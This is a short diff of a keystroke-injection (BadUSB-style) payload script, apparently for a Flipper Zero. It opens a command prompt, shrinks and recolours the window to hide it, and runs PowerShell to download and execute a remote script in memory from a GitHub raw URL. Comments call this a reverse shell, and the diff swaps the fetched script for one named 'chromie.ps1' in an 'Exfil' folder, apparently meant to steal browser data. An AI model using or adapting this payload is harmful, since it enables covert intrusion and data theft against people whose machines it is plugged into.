@@ -15,7 +15,7 @@ STRING cmd.exe
 ENTER 
 DELAY 750
 REM @@ Changing the color, risizing the CMD and executing the reverse shell in memory
-STRING cmd /C color FE&mode con:cols=18 lines=1&powershell "iex(iwr raw.githubusercontent.com/baph0m3th/FZ/main/Exfil/cwh.ps1)"
+STRING cmd /C color FE&mode con:cols=18 lines=1&powershell "iex(iwr raw.githubusercontent.com/baph0m3th/FZ/main/Exfil/chromie.ps1)"
 DELAY 950
 ENTER
 REM @@ Minimizing the CMD
